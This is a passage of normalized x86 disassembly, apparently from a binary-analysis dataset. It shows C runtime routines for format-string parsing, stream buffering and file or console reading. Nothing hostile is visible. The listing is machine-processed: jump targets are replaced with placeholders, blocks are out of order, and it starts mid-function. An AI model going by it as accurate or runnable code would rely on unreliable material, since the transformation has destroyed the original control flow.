je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
cmp [ ebp - 0x444 ] bl
je r-xdata
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x448 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov ecx [ ebp - 0x448 ]
and [ ecx + 0x70 ] 0xfffffffd
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_42080b ]
mov edi [ ebp - 0x434 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
sar eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x7
ja r-xdata
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_429d7f
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x440 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_417912
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_429de1
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_429db5
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x450 ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_418531
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x45c ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x450 ]
movzx eax al
push ecx
push eax
call sub_427df7
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_429fdf
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_429de1
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_429db5
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_41b8d1
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x448 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_41a7f0
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_429db5
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x45c ]
call sub_429d7f
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_42a0f0
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x45c ]
push ecx
push eax
call sub_429fdf
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_42082b
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
mov eax [ edi + 0xc ]
test al 0x83
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ edi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ edi ] eax
push edi
call sub_423d3f
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ edi + 0xc ] eax
and [ edi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ edi + 0x18 ]
push [ edi + 0x8 ]
push edi
call sub_42094c
pop ecx
push eax
call sub_420970
add esp 0xc
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
test [ edi + 0xc ] 0x82
jne r-xdata
cmp [ edi + 0x18 ] 0x200
jne r-xdata
push edi
call sub_42094c
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ edi ]
dec [ edi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ edi ] ecx
jmp r-xdata
test [ edi + 0xc ] 0x8
je r-xdata
mov eax rw-data
push edi
call sub_42094c
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop ebp
retn
test [ edi + 0xc ] 0x400
jne r-xdata
or [ edi + 0xc ] 0x2000
push esi
push edi
call sub_42094c
mov esi eax
push edi
sar esi 0x5
call sub_42094c
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
pop esi
jmp r-xdata
mov [ edi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_42094c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
pop ebp
retn
sub_420970
push 0x10
push r--data
call sub_41ecb0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push esi
call sub_42a185
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x16
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_420a78
add esp 0xc
mov edi eax
jmp r-xdata
call sub_41f411
call sub_41ecf5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420a4f
mov eax edi
jmp r-xdata
sub_420a78
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0xfffffffe
pop ecx
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x28 ] esi
cmp eax ecx
jne r-xdata
test eax eax
js r-xdata
call sub_41ccbd
mov [ eax ] edi
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccbd
mov [ eax ] edi
call sub_41ccf1
mov [ eax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ecx eax
sar ecx 0x5
mov ebx eax
mov edx [ ecx * 4 + rw-data ]
and ebx 0x1f
shl ebx 0x6
mov [ ebp - 0xc ] ecx
mov al [ edx + ebx + 0x4 ]
mov [ ebp - 0x24 ] ebx
test al 0x1
je r-xdata
cmp esi 0x7fffffff
jbe r-xdata
test esi esi
je r-xdata
call sub_41ccbd
mov [ eax ] edi
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
call sub_41f411
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
mov al [ edx + ebx + 0x24 ]
add al al
sar al 0x1
mov [ ebp + 0x13 ] al
movsx eax al
dec eax
je r-xdata
call sub_41ccbd
and [ eax ] edi
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
dec eax
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
jmp r-xdata
shr esi 0x1
cmp esi 0x4
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
push esi
call sub_41b8d1
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
push 0x4
pop esi
mov edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
test [ edx + ebx + 0x4 ] 0x48
mov [ ebp - 0x1c ] eax
je r-xdata
and esi 0xfffffffe
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_421d63
mov ecx [ ebp - 0xc ]
add esp 0x10
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + ebx + 0x28 ] eax
mov eax [ ebp - 0x10 ]
mov [ ecx + ebx + 0x2c ] edx
mov ecx [ ebp - 0xc ]
call sub_41ccf1
mov [ eax ] 0xc
call sub_41ccbd
mov [ eax ] 0x8
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4290d7
test eax eax
mov eax [ ebp - 0xc ]
pop ecx
je r-xdata
mov dl [ edx + ebx + 0x5 ]
cmp dl 0xa
je r-xdata
mov eax [ eax * 4 + rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x80
je r-xdata
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ecx + ebx ]
call [ GetConsoleMode@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ eax ] dl
xor edi edi
lea edx [ eax + 0x1 ]
mov eax [ ecx * 4 + rw-data ]
inc edi
dec esi
cmp [ ebp + 0x13 ] 0x0
mov [ ebp - 0x1c ] edx
mov [ eax + ebx + 0x5 ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
mov [ eax ] esi
jmp r-xdata
cmp ecx esi
ja r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x13 ] 0x2
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x25 ]
cmp al 0xa
je r-xdata
push eax
call sub_41ccd0
pop ecx
xor ebx ebx
jmp r-xdata
or ebx 0xffffffff
mov edx [ ebp - 0xc ]
add edi ecx
mov esi [ edx * 4 + rw-data ]
mov al [ esi + ebx + 0x4 ]
test al al
jns r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
shr esi 0x1
mov eax [ eax * 4 + rw-data ]
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x13 ] 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ eax + eax ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
inc edx
push 0x2
dec esi
cmp [ ebp + 0x13 ] 0x1
mov [ ebp - 0x1c ] edx
pop edi
mov [ eax + ebx + 0x25 ] 0xa
jne r-xdata
cmp ebx 0xfffffffe
je r-xdata
push eax
call sub_417912
pop ecx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x26 ]
cmp al 0xa
je r-xdata
mov eax edi
jmp r-xdata
mov edi ebx
test ecx ecx
je r-xdata
mov esi [ ebp - 0x10 ]
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov edi esi
mov ecx esi
lea edx [ edi + eax * 2 ]
cmp edi edx
jae r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
cmp [ ecx ] 0xa
jne r-xdata
test esi esi
je r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
push 0xa
pop edx
cmp [ ecx ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
and edi 0xfffffffe
jmp r-xdata
push 0xd
mov [ ebp + 0x10 ] 0x1a
pop edi
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
cmp [ ebp + 0x13 ] 0x1
jne r-xdata
push 0xd
pop ecx
mov edi eax
or al 0x4
jmp r-xdata
push 0x3
pop edi
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
push 0xa
inc edx
pop ecx
mov [ ebp - 0x1c ] edx
dec esi
mov [ eax + ebx + 0x26 ] cl
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
jmp r-xdata
push 0xd
pop ecx
mov [ ebp + 0x10 ] 0x1a
mov edi eax
or al 0x4
jmp r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax * 4 + rw-data ]
or [ eax + ebx + 0x4 ] 0x2
cmp ax di
je r-xdata
test edi edi
je r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp al cl
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
cmp eax ecx
jae r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp ax cx
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] ecx
cmp eax ecx
jae r-xdata
lea eax [ edx - 0x2 ]
cmp ecx eax
jae r-xdata
mov [ esi ] ax
add esi 0x2
add ecx 0x2
jmp r-xdata
dec esi
mov al [ esi ]
test al al
js r-xdata
mov al [ edi ]
mov [ esi ] al
inc esi
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
dec eax
cmp edi eax
jae r-xdata
mov [ esi ] al
inc esi
inc edi
jmp r-xdata
mov ax [ edi ]
mov [ esi ] ax
add esi 0x2
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xfffffffe
cmp edi eax
jae r-xdata
mov [ esi ] ax
jmp r-xdata
cmp ecx edx
jb r-xdata
push 0xa
add ecx 0x2
pop eax
cmp [ ecx ] ax
je r-xdata
movzx eax al
xor edx edx
inc edx
cmp [ eax + rw-data ] 0x0
jne r-xdata
inc esi
jmp r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edx * 4 + rw-data ]
inc edi
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
cmp edi [ ebp - 0x1c ]
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edx * 4 + rw-data ]
add edi 0x2
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push 0xa
pop edx
cmp [ edi + 0x2 ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
add esi 0x2
add edi 0x2
jmp r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov [ esi ] ax
add esi 0x2
push 0xd
pop eax
push eax
pop edi
movzx eax [ esi ]
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov edi [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
sub esi edi
push esi
push edi
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
